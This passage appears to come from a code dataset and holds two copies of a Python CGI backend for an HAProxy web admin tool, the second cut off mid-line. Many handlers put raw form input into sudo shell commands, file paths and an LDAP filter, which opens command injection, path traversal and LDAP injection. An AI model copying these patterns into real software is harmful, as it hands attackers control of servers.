\t\tprint(\"HAproxy was %s\" % action) \telse: \t\tprint(\"Bad config, check please\") \t if form.getvalue('action_waf') is not None and serv is not None: \tserv=form.getvalue('serv') \taction=form.getvalue('action_waf') \tcommands=[ \"sudo systemctl %s waf\" % action] \tfunct.ssh_command(serv, commands)\t\t \t if act==\"overview\": \tovw.get_overview() \t if act==\"overviewwaf\": \tovw.get_overviewWaf(form.getvalue('page')) \t if act==\"overviewServers\": \tovw.get_overviewServers() \t if form.getvalue('action'): \timport requests \tfrom requests_toolbelt.utils import dump \t \thaproxy_user=sql.get_setting('stats_user') \thaproxy_pass=sql.get_setting('stats_password') \tstats_port=sql.get_setting('stats_port') \tstats_page=sql.get_setting('stats_page') \t \tpostdata={ \t\t'action': form.getvalue('action'), \t\t's': form.getvalue('s'), \t\t'b': form.getvalue('b') \t} \theaders={ \t\t'User-Agent': 'Mozilla/5.0(Windows NT 5.1; rv:20.0) Gecko/20100101 Firefox/20.0', \t\t'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', \t\t'Accept-Language': 'en-US,en;q=0.5', \t\t'Accept-Encoding': 'gzip, deflate' \t} \tq=requests.post('http://'+serv+':'+stats_port+'/'+stats_page, headers=headers, data=postdata, auth=(haproxy_user, haproxy_pass)) \t if serv is not None and act==\"stats\": \timport requests \tfrom requests_toolbelt.utils import dump \t \thaproxy_user=sql.get_setting('stats_user') \thaproxy_pass=sql.get_setting('stats_password') \tstats_port=sql.get_setting('stats_port') \tstats_page=sql.get_setting('stats_page') \ttry: \t\tresponse=requests.get('http://%s:%s/%s' %(serv, stats_port, stats_page), auth=(haproxy_user, haproxy_pass)) \texcept requests.exceptions.ConnectTimeout: \t\tprint('Oops. Connection timeout occured!') \texcept requests.exceptions.ReadTimeout: \t\tprint('Oops. Read timeout occured') \texcept requests.exceptions.HTTPError as errh: \t\tprint(\"Http Error:\",errh) \texcept requests.exceptions.ConnectionError as errc: \t\tprint('<div class=\"alert alert-danger\">Error Connecting: %s</div>' % errc) \texcept requests.exceptions.Timeout as errt: \t\tprint(\"Timeout Error:\",errt) \texcept requests.exceptions.RequestException as err: \t\tprint(\"OOps: Something Else\",err) \t\t \tdata=response.content \tprint(data.decode('utf-8')) if serv is not None and form.getvalue('rows') is not None: \trows=form.getvalue('rows') \twaf=form.getvalue('waf') \tgrep=form.getvalue('grep') \thour=form.getvalue('hour') \tminut=form.getvalue('minut') \thour1=form.getvalue('hour1') \tminut1=form.getvalue('minut1') \tdate=hour+':'+minut \tdate1=hour1+':'+minut1 \t \tif grep is not None: \tgrep_act ='|grep' \telse: \t\tgrep_act='' \t\tgrep='' \tsyslog_server_enable=sql.get_setting('syslog_server_enable') \tif syslog_server_enable is None or syslog_server_enable==\"0\": \t\tlocal_path_logs=sql.get_setting('local_path_logs') \t\tsyslog_server=serv\t \t\tcommands=[ \"sudo cat %s| awk '$3>\\\"%s:00\\\" && $3<\\\"%s:00\\\"' |tail -%s %s %s\" %(local_path_logs, date, date1, rows, grep_act, grep)]\t\t \telse: \t\tcommands=[ \"sudo cat /var/log/%s/syslog.log | sed '/ %s:00/,/ %s:00/! d' |tail -%s %s %s\" %(serv, date, date1, rows, grep_act, grep)] \t\tsyslog_server=sql.get_setting('syslog_server') \t \tif waf==\"1\": \t\tlocal_path_logs='/var/log/modsec_audit.log' \t\tcommands=[ \"sudo cat %s |tail -%s %s %s\" %(local_path_logs, rows, grep_act, grep)]\t \t\t \tfunct.ssh_command(syslog_server, commands, show_log=\"1\") \t if serv is not None and form.getvalue('rows1') is not None: \trows=form.getvalue('rows1') \tgrep=form.getvalue('grep') \thour=form.getvalue('hour') \tminut=form.getvalue('minut') \thour1=form.getvalue('hour1') \tminut1=form.getvalue('minut1') \tdate=hour+':'+minut \tdate1=hour1+':'+minut1 \tapache_log_path=sql.get_setting('apache_log_path') \t \tif grep is not None: \t\tgrep_act ='|grep' \telse: \t\tgrep_act='' \t\tgrep='' \t\t \tif serv=='haproxy-wi.access.log': \t\tcmd=\"cat %s| awk -F\\\"/|:\\\" '$3>\\\"%s:00\\\" && $3<\\\"%s:00\\\"' |tail -%s %s %s\" %(apache_log_path+\"/\"+serv, date, date1, rows, grep_act, grep) \telse: \t\tcmd=\"cat %s| awk '$4>\\\"%s:00\\\" && $4<\\\"%s:00\\\"' |tail -%s %s %s\" %(apache_log_path+\"/\"+serv, date, date1, rows, grep_act, grep) \toutput, stderr=funct.subprocess_execute(cmd) \tfunct.show_log(output) \tprint(stderr) \t\t if form.getvalue('viewlogs') is not None: \tviewlog=form.getvalue('viewlogs') \tlog_path=funct.get_config_var('main', 'log_path') \trows=form.getvalue('rows2') \tgrep=form.getvalue('grep') \thour=form.getvalue('hour') \tminut=form.getvalue('minut') \thour1=form.getvalue('hour1') \tminut1=form.getvalue('minut1') \tdate=hour+':'+minut \tdate1=hour1+':'+minut1 \t \tif grep is not None: \t\tgrep_act ='|grep' \telse: \t\tgrep_act='' \t\tgrep='' \tcmd=\"cat %s| awk '$3>\\\"%s:00\\\" && $3<\\\"%s:00\\\"' |tail -%s %s %s\" %(log_path +viewlog, date, date1, rows, grep_act, grep) \toutput, stderr=funct.subprocess_execute(cmd) \tfunct.show_log(output) \tprint(stderr) \t\t if serv is not None and act==\"showMap\": \tovw.get_map(serv) \t if form.getvalue('servaction') is not None: \tserver_state_file=sql.get_setting('server_state_file') \thaproxy_sock=sql.get_setting('haproxy_sock') \tenable=form.getvalue('servaction') \tbackend=form.getvalue('servbackend')\t \tcmd='echo \"%s %s\" |sudo socat stdio %s | cut -d \",\" -f 1-2,5-10,18,34-36 | column -s, -t' %(enable, backend, haproxy_sock) \t \tif form.getvalue('save')==\"on\": \t\tsave_command='echo \"show servers state\" | sudo socat stdio %s > %s' %(haproxy_sock, server_state_file) \t\tcommand=[ cmd, save_command] \telse: \t\tcommand=[ cmd] \t\t \tif enable !=\"show\": \t\tprint('<center><h3>You %s %s on HAproxy %s. <a href=\"viewsttats.py?serv=%s\" title=\"View stat\" target=\"_blank\">Look it</a> or <a href=\"edit.py\" title=\"Edit\">Edit something else</a></h3><br />' %(enable, backend, serv, serv)) \t\t\t \tfunct.ssh_command(serv, command, show_log=\"1\") \taction='edit.py ' +enable +' ' +backend \tfunct.logging(serv, action) if act==\"showCompareConfigs\": \timport glob \tfrom jinja2 import Environment, FileSystemLoader \tenv=Environment(loader=FileSystemLoader('templates/ajax')) \ttemplate=env.get_template('/show_compare_configs.html') \tleft=form.getvalue('left') \tright=form.getvalue('right') \t \ttemplate=template.render(serv=serv, right=right, left=left, return_files=funct.get_files())\t\t\t\t\t\t\t\t\t \tprint(template) \t if serv is not None and form.getvalue('right') is not None: \tfrom jinja2 import Environment, FileSystemLoader \tleft=form.getvalue('left') \tright=form.getvalue('right') \thap_configs_dir=funct.get_config_var('configs', 'haproxy_save_configs_dir') \tcmd='diff -ub %s%s %s%s' %(hap_configs_dir, left, hap_configs_dir, right)\t \tenv=Environment(loader=FileSystemLoader('templates/ajax'),extensions=['jinja2.ext.loopcontrols', \"jinja2.ext.do\"]) \ttemplate=env.get_template('compare.html') \t \toutput, stderr=funct.subprocess_execute(cmd) \ttemplate=template.render(stdout=output)\t \t \tprint(template) \tprint(stderr) \t if serv is not None and act==\"configShow\": \thap_configs_dir=funct.get_config_var('configs', 'haproxy_save_configs_dir') \t \tif form.getvalue('configver') is None:\t \t\tcfg=hap_configs_dir +serv +\"-\" +funct.get_data('config') +\".cfg\" \t\tfunct.get_config(serv, cfg) \telse: \t\tcfg=hap_configs_dir +form.getvalue('configver') \t\t\t \ttry: \t\tconf=open(cfg, \"r\") \texcept IOError: \t\tprint('<div class=\"alert alert-danger\">Can\\'t read import config file</div>') \t\t \tfrom jinja2 import Environment, FileSystemLoader \tenv=Environment(loader=FileSystemLoader('templates/ajax'),extensions=['jinja2.ext.loopcontrols']) \ttemplate=env.get_template('config_show.html') \t \ttemplate=template.render(conf=conf, view=form.getvalue('view'), serv=serv, configver=form.getvalue('configver'), role=funct.is_admin(level=2))\t\t\t\t\t\t\t\t\t\t\t \tprint(template) \t \tif form.getvalue('configver') is None: \t\tos.system(\"/bin/rm -f \" +cfg)\t \t\t if form.getvalue('master'): \tmaster=form.getvalue('master') \tslave=form.getvalue('slave') \tinterface=form.getvalue('interface') \tvrrpip=form.getvalue('vrrpip') \ttmp_config_path=sql.get_setting('tmp_config_path') \tscript=\"install_keepalived.sh\" \t \tif form.getvalue('hap')==\"1\": \t\tfunct.install_haproxy(master) \t\tfunct.install_haproxy(slave) \t\t \tif form.getvalue('syn_flood')==\"1\": \t\tfunct.syn_flood_protect(master) \t\tfunct.syn_flood_protect(slave) \t \tos.system(\"cp scripts/%s.\" % script) \t\t \terror=str(funct.upload(master, tmp_config_path, script)) \tif error: \t\tprint('error: '+error) \t\tsys.exit() \tfunct.upload(slave, tmp_config_path, script) \tfunct.ssh_command(master,[\"sudo chmod +x \"+tmp_config_path+script, tmp_config_path+script+\" MASTER \"+interface+\" \"+vrrpip]) \tfunct.ssh_command(slave,[\"sudo chmod +x \"+tmp_config_path+script, tmp_config_path+script+\" BACKUP \"+interface+\" \"+vrrpip]) \t\t\t \tos.system(\"rm -f %s\" % script) \tsql.update_server_master(master, slave) \t if form.getvalue('masteradd'): \tmaster=form.getvalue('masteradd') \tslave=form.getvalue('slaveadd') \tinterface=form.getvalue('interfaceadd') \tvrrpip=form.getvalue('vrrpipadd') \tkp=form.getvalue('kp') \ttmp_config_path=sql.get_setting('tmp_config_path') \tscript=\"add_vrrp.sh\" \t \tos.system(\"cp scripts/%s.\" % script) \t\t \terror=str(funct.upload(master, tmp_config_path, script)) \tif error: \t\tprint('error: '+error) \t\tsys.exit() \tfunct.upload(slave, tmp_config_path, script) \t \tfunct.ssh_command(master,[\"sudo chmod +x \"+tmp_config_path+script, tmp_config_path+script+\" MASTER \"+interface+\" \"+vrrpip+\" \"+kp]) \tfunct.ssh_command(slave,[\"sudo chmod +x \"+tmp_config_path+script, tmp_config_path+script+\" BACKUP \"+interface+\" \"+vrrpip+\" \"+kp]) \t\t\t \tos.system(\"rm -f %s\" % script) \t if form.getvalue('haproxyaddserv'): \tfunct.install_haproxy(form.getvalue('haproxyaddserv'), syn_flood=form.getvalue('syn_flood')) \t if form.getvalue('installwaf'): \tfunct.waf_install(form.getvalue('installwaf')) \t if form.getvalue('metrics_waf'): \tsql.update_waf_metrics_enable(form.getvalue('metrics_waf'), form.getvalue('enable')) \t\t if form.getvalue('table_metrics'): \timport http.cookies \tfrom jinja2 import Environment, FileSystemLoader \tenv=Environment(loader=FileSystemLoader('templates/ajax')) \ttemplate=env.get_template('table_metrics.html') \t\t \tcookie=http.cookies.SimpleCookie(os.environ.get(\"HTTP_COOKIE\")) \tuser_id=cookie.get('uuid')\t \ttable_stat=sql.select_table_metrics(user_id.value) \ttemplate=template.render(table_stat=sql.select_table_metrics(user_id.value))\t\t\t\t\t\t\t\t\t\t\t \tprint(template) \t\t if form.getvalue('metrics'): \tfrom datetime import timedelta \tfrom bokeh.plotting import figure, output_file, show \tfrom bokeh.models import ColumnDataSource, HoverTool, DatetimeTickFormatter, DatePicker \tfrom bokeh.layouts import widgetbox, gridplot \tfrom bokeh.models.widgets import Button, RadioButtonGroup, Select \timport pandas as pd \timport http.cookies \t\t \tcookie=http.cookies.SimpleCookie(os.environ.get(\"HTTP_COOKIE\")) \tuser_id=cookie.get('uuid')\t \tservers=sql.select_servers_metrics(user_id.value) \tservers=sorted(servers) \t \tp={} \tfor serv in servers: \t\tserv=serv[0] \t\tp[serv]={} \t\tmetric=sql.select_metrics(serv) \t\tmetrics={} \t\t \t\tfor i in metric: \t\t\trep_date=str(i[5]) \t\t\tmetrics[rep_date]={} \t\t\tmetrics[rep_date]['server']=str(i[0]) \t\t\tmetrics[rep_date]['curr_con']=str(i[1]) \t\t\tmetrics[rep_date]['curr_ssl_con']=str(i[2]) \t\t\tmetrics[rep_date]['sess_rate']=str(i[3]) \t\t\tmetrics[rep_date]['max_sess_rate']=str(i[4]) \t\tdf=pd.DataFrame.from_dict(metrics, orient=\"index\") \t\tdf=df.fillna(0) \t\tdf.index=pd.to_datetime(df.index) \t\tdf.index.name='Date' \t\tdf.sort_index(inplace=True) \t\tsource=ColumnDataSource(df) \t\t \t\toutput_file(\"templates/metrics_out.html\", mode='inline') \t\t \t\tx_min=df.index.min() -pd.Timedelta(hours=1) \t\tx_max=df.index.max() +pd.Timedelta(minutes=1) \t\tp[serv]=figure( \t\t\ttools=\"pan,box_zoom,reset,xwheel_zoom\",\t\t \t\t\ttitle=metric[0][0], \t\t\tx_axis_type=\"datetime\", y_axis_label='Connections', \t\t\tx_range=(x_max.timestamp()*1000-60*100000, x_max.timestamp()*1000) \t\t\t) \t\t\t \t\thover=HoverTool( \t\t\ttooltips=[ \t\t\t\t(\"Connections\", \"@curr_con\"), \t\t\t\t(\"SSL connections\", \"@curr_ssl_con\"), \t\t\t\t(\"Sessions rate\", \"@sess_rate\") \t\t\t], \t\t\tmode='mouse' \t\t) \t\t \t\tp[serv].ygrid.band_fill_color=\" \t\tp[serv].ygrid.band_fill_alpha=0.9 \t\tp[serv].y_range.start=0 \t\tp[serv].y_range.end=int(df['curr_con'].max()) +150 \t\tp[serv].add_tools(hover) \t\tp[serv].title.text_font_size=\"20px\"\t\t\t\t\t\t \t\tp[serv].line(\"Date\", \"curr_con\", source=source, alpha=0.5, color=' \t\tp[serv].line(\"Date\", \"curr_ssl_con\", source=source, alpha=0.5, color=\" \t\tp[serv].line(\"Date\", \"sess_rate\", source=source, alpha=0.5, color=\" \t\tp[serv].legend.orientation=\"horizontal\" \t\tp[serv].legend.location=\"top_left\" \t\tp[serv].legend.padding=5 \tplots=[] \tfor key, value in p.items(): \t\tplots.append(value) \t\t \tgrid=gridplot(plots, ncols=2, plot_width=800, plot_height=250, toolbar_location=\"left\", toolbar_options=dict(logo=None)) \tshow(grid) \t if form.getvalue('waf_metrics'): \tfrom datetime import timedelta \tfrom bokeh.plotting import figure, output_file, show \tfrom bokeh.models import ColumnDataSource, HoverTool, DatetimeTickFormatter, DatePicker \tfrom bokeh.layouts import widgetbox, gridplot \tfrom bokeh.models.widgets import Button, RadioButtonGroup, Select \timport pandas as pd \timport http.cookies \t\t \tcookie=http.cookies.SimpleCookie(os.environ.get(\"HTTP_COOKIE\")) \tuser_id=cookie.get('uuid')\t \tservers=sql.select_waf_servers_metrics(user_id.value) \tservers=sorted(servers) \t \tp={} \tfor serv in servers: \t\tserv=serv[0] \t\tp[serv]={} \t\tmetric=sql.select_waf_metrics(serv) \t\tmetrics={} \t\t \t\tfor i in metric: \t\t\trep_date=str(i[2]) \t\t\tmetrics[rep_date]={} \t\t\tmetrics[rep_date]['conn']=str(i[1]) \t\tdf=pd.DataFrame.from_dict(metrics, orient=\"index\") \t\tdf=df.fillna(0) \t\tdf.index=pd.to_datetime(df.index) \t\tdf.index.name='Date' \t\tdf.sort_index(inplace=True) \t\tsource=ColumnDataSource(df) \t\t \t\toutput_file(\"templates/metrics_waf_out.html\", mode='inline') \t\t \t\tx_min=df.index.min() -pd.Timedelta(hours=1) \t\tx_max=df.index.max() +pd.Timedelta(minutes=1) \t\tp[serv]=figure( \t\t\ttools=\"pan,box_zoom,reset,xwheel_zoom\", \t\t\ttitle=metric[0][0], \t\t\tx_axis_type=\"datetime\", y_axis_label='Connections', \t\t\tx_range=(x_max.timestamp()*1000-60*100000, x_max.timestamp()*1000) \t\t\t) \t\t\t \t\thover=HoverTool( \t\t\ttooltips=[ \t\t\t\t(\"Connections\", \"@conn\"), \t\t\t], \t\t\tmode='mouse' \t\t) \t\t \t\tp[serv].ygrid.band_fill_color=\" \t\tp[serv].ygrid.band_fill_alpha=0.9 \t\tp[serv].y_range.start=0 \t\tp[serv].y_range.end=int(df['conn'].max()) +150 \t\tp[serv].add_tools(hover) \t\tp[serv].title.text_font_size=\"20px\"\t\t\t\t \t\tp[serv].line(\"Date\", \"conn\", source=source, alpha=0.5, color=' \t\tp[serv].legend.orientation=\"horizontal\" \t\tp[serv].legend.location=\"top_left\" \t\tp[serv].legend.padding=5 \t\t \tplots=[] \tfor key, value in p.items(): \t\tplots.append(value) \t\t \tgrid=gridplot(plots, ncols=2, plot_width=800, plot_height=250, toolbar_location=\"left\", toolbar_options=dict(logo=None)) \tshow(grid) \t if form.getvalue('get_hap_v'): \toutput=funct.check_haproxy_version(serv) \tprint(output) \t if form.getvalue('bwlists'): \tlist=os.path.dirname(os.getcwd())+\"/\"+sql.get_setting('lists_path')+\"/\"+form.getvalue('group')+\"/\"+form.getvalue('color')+\"/\"+form.getvalue('bwlists') \ttry: \t\tfile=open(list, \"r\") \t\tfile_read=file.read() \t\tfile.close \t\tprint(file_read) \texcept IOError: \t\tprint('<div class=\"alert alert-danger\" style=\"margin:0\">Cat\\'n read '+form.getvalue('color')+' list</div>') \t\t if form.getvalue('bwlists_create'): \tlist_name=form.getvalue('bwlists_create').split('.')[0] \tlist_name +='.lst' \tlist=os.path.dirname(os.getcwd())+\"/\"+sql.get_setting('lists_path')+\"/\"+form.getvalue('group')+\"/\"+form.getvalue('color')+\"/\"+list_name \ttry: \t\topen(list, 'a').close() \t\tprint('<div class=\"alert alert-success\" style=\"margin:0\">'+form.getvalue('color')+' list was created</div>') \texcept IOError as e: \t\tprint('<div class=\"alert alert-danger\" style=\"margin:0\">Cat\\'n create new '+form.getvalue('color')+' list. %s </div>' % e) \t\t if form.getvalue('bwlists_save'): \tlist=os.path.dirname(os.getcwd())+\"/\"+sql.get_setting('lists_path')+\"/\"+form.getvalue('group')+\"/\"+form.getvalue('color')+\"/\"+form.getvalue('bwlists_save') \ttry: \t\twith open(list, \"w\") as file: \t\t\tfile.write(form.getvalue('bwlists_content')) \texcept IOError as e: \t\tprint('<div class=\"alert alert-danger\" style=\"margin:0\">Cat\\'n save '+form.getvalue('color')+' list. %s </div>' % e) \t \tservers=sql.get_dick_permit() \tpath=sql.get_setting('haproxy_dir')+\"/\"+form.getvalue('color') \t \tfor server in servers: \t\tfunct.ssh_command(server[2],[\"sudo mkdir \"+path]) \t\terror=funct.upload(server[2], path+\"/\"+form.getvalue('bwlists_save'), list, dir='fullpath') \t\tif error: \t\t\tprint('<div class=\"alert alert-danger\">Upload fail: %s</div>' % error)\t\t\t \t\telse: \t\t\tprint('<div class=\"alert alert-success\" style=\"margin:10px\">Edited '+form.getvalue('color')+' list was uploaded to '+server[1]+'</div>') \t\t\tif form.getvalue('bwlists_restart')=='restart': \t\t\t\tfunct.ssh_command(server[2],[\"sudo \" +sql.get_setting('restart_command')]) \t\t\t if form.getvalue('get_lists'): \tlist=os.path.dirname(os.getcwd())+\"/\"+sql.get_setting('lists_path')+\"/\"+form.getvalue('group')+\"/\"+form.getvalue('color') \tlists=funct.get_files(dir=list, format=\"lst\") \tfor list in lists: \t\tprint(list) \t\t if form.getvalue('get_ldap_email'): \tusername=form.getvalue('get_ldap_email') \timport ldap \t \tserver=sql.get_setting('ldap_server') \tport=sql.get_setting('ldap_port') \tuser=sql.get_setting('ldap_user') \tpassword=sql.get_setting('ldap_password') \tldap_base=sql.get_setting('ldap_base') \tdomain=sql.get_setting('ldap_domain') \tldap_search_field=sql.get_setting('ldap_search_field') \tl=ldap.initialize(\"ldap://\"+server+':'+port) \ttry: \t\tl.protocol_version=ldap.VERSION3 \t\tl.set_option(ldap.OPT_REFERRALS, 0) \t\tbind=l.simple_bind_s(user, password) \t\tcriteria=\"(&(objectClass=user)(sAMAccountName=\"+username+\"))\" \t\tattributes=[ldap_search_field] \t\tresult=l.search_s(ldap_base, ldap.SCOPE_SUBTREE, criteria, attributes) \t\tresults=[entry for dn, entry in result if isinstance(entry, dict)] \t\ttry: \t\t\tprint('[\"'+results[0][ldap_search_field][0].decode(\"utf-8\")+'\",\"'+domain+'\"]') \t\texcept: \t\t\tprint('error: user not found') \tfinally: \t\tl.unbind() ",
                    "sourceWithComments": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\"\nimport cgi\nimport os, sys\nimport funct\nimport sql\nimport ovw\n\nform = cgi.FieldStorage()\nserv = form.getvalue('serv')\nact = form.getvalue('act')\n\t\nprint('Content-type: text/html\\n')\n\nif act == \"checkrestart\":\n\tservers = sql.get_dick_permit(ip=serv)\n\tfor server in servers:\n\t\tif server != \"\":\n\t\t\tprint(\"ok\")\n\t\t\tsys.exit()\n\tsys.exit()\n\nif form.getvalue('token') is None:\n\tprint(\"What the fuck?! U r hacker Oo?!\")\n\tsys.exit()\n\t\t\nif form.getvalue('getcerts') is not None and serv is not None:\n\tcert_path = sql.get_setting('cert_path')\n\tcommands = [ \"ls -1t \"+cert_path+\" |grep pem\" ]\n\ttry:\n\t\tfunct.ssh_command(serv, commands, ip=\"1\")\n\texcept:\n\t\tprint('<div class=\"alert alert-danger\" style=\"margin:0\">Can not connect to the server</div>')\n\nif form.getvalue('checkSshConnect') is not None and serv is not None:\n\ttry:\n\t\tfunct.ssh_command(serv, [\"ls -1t\"])\n\texcept:\n\t\tprint('<div class=\"alert alert-danger\" style=\"margin:0\">Can not connect to the server</div>')\n\t\t\nif form.getvalue('getcert') is not None and serv is not None:\n\tid = form.getvalue('getcert')\n\tcert_path = sql.get_setting('cert_path')\n\tcommands = [ \"cat \"+cert_path+\"/\"+id ]\n\ttry:\n\t\tfunct.ssh_command(serv, commands, ip=\"1\")\n\texcept:\n\t\tprint('<div class=\"alert alert-danger\" style=\"margin:0\">Can not connect to the server</div>')\n\t\t\nif form.getvalue('ssh_cert'):\n\tname = form.getvalue('name')\n\t\n\tif not os.path.exists(os.getcwd()+'/keys/'):\n\t\tos.makedirs(os.getcwd()+'/keys/')\n\t\n\tssh_keys = os.path.dirname(os.getcwd())+'/keys/'+name+'.pem'\n\t\n\ttry:\n\t\twith open(ssh_keys, \"w\") as conf:\n\t\t\tconf.write(form.getvalue('ssh_cert'))\n\texcept IOError:\n\t\tprint('<div class=\"alert alert-danger\">Can\\'t save ssh keys file. Check ssh keys path in config</div>')\n\telse:\n\t\tprint('<div class=\"alert alert-success\">Ssh key was save into: %s </div>' % ssh_keys)\n\ttry:\n\t\tfunct.logging(\"local\", \"users.py#ssh upload new ssh cert %s\" % ssh_keys)\n\texcept:\n\t\tpass\n\t\t\t\nif serv and form.getvalue('ssl_cert'):\n\tcert_local_dir = funct.get_config_var('main', 'cert_local_dir')\n\tcert_path = sql.get_setting('cert_path')\n\t\n\tif not os.path.exists(cert_local_dir):\n\t\tos.makedirs(cert_local_dir)\n\t\n\tif form.getvalue('ssl_name') is None:\n\t\tprint('<div class=\"alert alert-danger\">Please enter desired name</div>')\n\telse:\n\t\tname = form.getvalue('ssl_name') + '.pem'\n\t\n\ttry:\n\t\twith open(name, \"w\") as ssl_cert:\n\t\t\tssl_cert.write(form.getvalue('ssl_cert'))\n\texcept IOError:\n\t\tprint('<div class=\"alert alert-danger\">Can\\'t save ssl keys file. Check ssh keys path in config</div>')\n\telse:\n\t\tprint('<div class=\"alert alert-success\">SSL file was upload to %s into: %s </div>' % (serv, cert_path))\n\t\t\n\tMASTERS = sql.is_master(serv)\n\tfor master in MASTERS:\n\t\tif master[0] != None:\n\t\t\tfunct.upload(master[0], cert_path, name)\n\ttry:\n\t\tfunct.upload(serv, cert_path, name)\n\texcept:\n\t\tpass\n\t\n\tos.system(\"mv %s %s\" % (name, cert_local_dir))\n\tfunct.logging(serv, \"add.py#ssl upload new ssl cert %s\" % name)\n\t\nif form.getvalue('backend') is not None:\n\tfunct.show_backends(serv)\n\t\nif form.getvalue('ip') is not None and serv is not None:\n\tcommands = [ \"sudo ip a |grep inet |egrep -v  '::1' |awk '{ print $2  }' |awk -F'/' '{ print $1  }'\" ]\n\tfunct.ssh_command(serv, commands, ip=\"1\")\n\t\nif form.getvalue('showif'):\n\tcommands = [\"sudo ip link|grep 'UP' | awk '{print $2}'  |awk -F':' '{print $1}'\"]\n\tfunct.ssh_command(serv, commands, ip=\"1\")\n\t\nif form.getvalue('action_hap') is not None and serv is not None:\n\taction = form.getvalue('action_hap')\n\t\n\tif funct.check_haproxy_config(serv):\n\t\tcommands = [ \"sudo systemctl %s haproxy\" % action ]\n\t\tfunct.ssh_command(serv, commands)\t\t\n\t\tprint(\"HAproxy was %s\" % action)\n\telse:\n\t\tprint(\"Bad config, check please\")\n\t\nif form.getvalue('action_waf') is not None and serv is not None:\n\tserv = form.getvalue('serv')\n\taction = form.getvalue('action_waf')\n\n\tcommands = [ \"sudo systemctl %s waf\" % action ]\n\tfunct.ssh_command(serv, commands)\t\t\n\t\nif act == \"overview\":\n\tovw.get_overview()\n\t\nif act == \"overviewwaf\":\n\tovw.get_overviewWaf(form.getvalue('page'))\n\t\nif act == \"overviewServers\":\n\tovw.get_overviewServers()\n\t\nif form.getvalue('action'):\n\timport requests\n\tfrom requests_toolbelt.utils import dump\n\t\n\thaproxy_user = sql.get_setting('stats_user')\n\thaproxy_pass = sql.get_setting('stats_password')\n\tstats_port = sql.get_setting('stats_port')\n\tstats_page = sql.get_setting('stats_page')\n\t\n\tpostdata = {\n\t\t'action' : form.getvalue('action'),\n\t\t's' : form.getvalue('s'),\n\t\t'b' : form.getvalue('b')\n\t}\n\n\theaders = {\n\t\t'User-Agent' : 'Mozilla/5.0 (Windows NT 5.1; rv:20.0) Gecko/20100101 Firefox/20.0',\n\t\t'Accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',\n\t\t'Accept-Language' : 'en-US,en;q=0.5',\n\t\t'Accept-Encoding' : 'gzip, deflate'\n\t}\n\n\tq = requests.post('http://'+serv+':'+stats_port+'/'+stats_page, headers=headers, data=postdata, auth=(haproxy_user, haproxy_pass))\n\t\nif serv is not None and act == \"stats\":\n\timport requests\n\tfrom requests_toolbelt.utils import dump\n\t\n\thaproxy_user = sql.get_setting('stats_user')\n\thaproxy_pass = sql.get_setting('stats_password')\n\tstats_port = sql.get_setting('stats_port')\n\tstats_page = sql.get_setting('stats_page')\n\ttry:\n\t\tresponse = requests.get('http://%s:%s/%s' % (serv, stats_port, stats_page), auth=(haproxy_user, haproxy_pass)) \n\texcept requests.exceptions.ConnectTimeout:\n\t\tprint('Oops. Connection timeout occured!')\n\texcept requests.exceptions.ReadTimeout:\n\t\tprint('Oops. Read timeout occured')\n\texcept requests.exceptions.HTTPError as errh:\n\t\tprint (\"Http Error:\",errh)\n\texcept requests.exceptions.ConnectionError as errc:\n\t\tprint ('<div class=\"alert alert-danger\">Error Connecting: %s</div>' % errc)\n\texcept requests.exceptions.Timeout as errt:\n\t\tprint (\"Timeout Error:\",errt)\n\texcept requests.exceptions.RequestException as err:\n\t\tprint (\"OOps: Something Else\",err)\n\t\t\n\tdata = response.content\n\tprint(data.decode('utf-8'))\n\nif serv is not None and form.getvalue('rows') is not None:\n\trows = form.getvalue('rows')\n\twaf = form.getvalue('waf')\n\tgrep = form.getvalue('grep')\n\thour = form.getvalue('hour')\n\tminut = form.getvalue('minut')\n\thour1 = form.getvalue('hour1')\n\tminut1 = form.getvalue('minut1')\n\tdate = hour+':'+minut\n\tdate1 = hour1+':'+minut1\n\t\n\tif grep is not None:\n        \tgrep_act  = '|grep'\n\telse:\n\t\tgrep_act = ''\n\t\tgrep = ''\n\n\tsyslog_server_enable = sql.get_setting('syslog_server_enable')\n\tif syslog_server_enable is None or syslog_server_enable == \"0\":\n\t\tlocal_path_logs = sql.get_setting('local_path_logs')\n\t\tsyslog_server = serv\t\n\t\tcommands = [ \"sudo cat %s| awk '$3>\\\"%s:00\\\" && $3<\\\"%s:00\\\"' |tail -%s  %s %s\" % (local_path_logs, date, date1, rows, grep_act, grep) ]\t\t\n\telse:\n\t\tcommands = [ \"sudo cat /var/log/%s/syslog.log | sed '/ %s:00/,/ %s:00/! d' |tail -%s  %s %s\" % (serv, date, date1, rows, grep_act, grep) ]\n\t\tsyslog_server = sql.get_setting('syslog_server')\n\t\n\tif waf == \"1\":\n\t\tlocal_path_logs = '/var/log/modsec_audit.log'\n\t\tcommands = [ \"sudo cat %s |tail -%s  %s %s\" % (local_path_logs, rows, grep_act, grep) ]\t\n\t\t\n\tfunct.ssh_command(syslog_server, commands, show_log=\"1\")\n\t\nif serv is not None and form.getvalue('rows1') is not None:\n\trows = form.getvalue('rows1')\n\tgrep = form.getvalue('grep')\n\thour = form.getvalue('hour')\n\tminut = form.getvalue('minut')\n\thour1 = form.getvalue('hour1')\n\tminut1 = form.getvalue('minut1')\n\tdate = hour+':'+minut\n\tdate1 = hour1+':'+minut1\n\tapache_log_path = sql.get_setting('apache_log_path')\n\t\n\tif grep is not None:\n\t\tgrep_act  = '|grep'\n\telse:\n\t\tgrep_act = ''\n\t\tgrep = ''\n\t\t\n\tif serv == 'haproxy-wi.access.log':\n\t\tcmd=\"cat %s| awk -F\\\"/|:\\\" '$3>\\\"%s:00\\\" && $3<\\\"%s:00\\\"' |tail -%s  %s %s\" % (apache_log_path+\"/\"+serv, date, date1, rows, grep_act, grep)\n\telse:\n\t\tcmd=\"cat %s| awk '$4>\\\"%s:00\\\" && $4<\\\"%s:00\\\"' |tail -%s  %s %s\" % (apache_log_path+\"/\"+serv, date, date1, rows, grep_act, grep)\n\n\toutput, stderr = funct.subprocess_execute(cmd)\n\n\tfunct.show_log(output)\n\tprint(stderr)\n\t\t\nif form.getvalue('viewlogs') is not None:\n\tviewlog = form.getvalue('viewlogs')\n\tlog_path = funct.get_config_var('main', 'log_path')\n\trows = form.getvalue('rows2')\n\tgrep = form.getvalue('grep')\n\thour = form.getvalue('hour')\n\tminut = form.getvalue('minut')\n\thour1 = form.getvalue('hour1')\n\tminut1 = form.getvalue('minut1')\n\tdate = 